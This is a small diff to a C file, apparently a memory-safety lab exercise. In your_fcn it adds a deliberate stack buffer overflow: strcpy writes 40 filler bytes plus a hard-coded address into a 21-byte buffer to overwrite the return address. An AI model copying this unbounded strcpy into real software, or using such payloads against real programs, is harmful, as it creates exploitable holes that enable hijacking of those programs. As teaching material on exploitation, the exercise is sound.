@@ -1,7 +1,10 @@
 #include <stdio.h> /* for printf() */
 #include <stdlib.h> /* for exit() */
+#include <string.h>
 
 int your_fcn(void) {
+	char buf[21];
+	strcpy(buf, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x58\x06\x40");
 	return 0;
 }
 
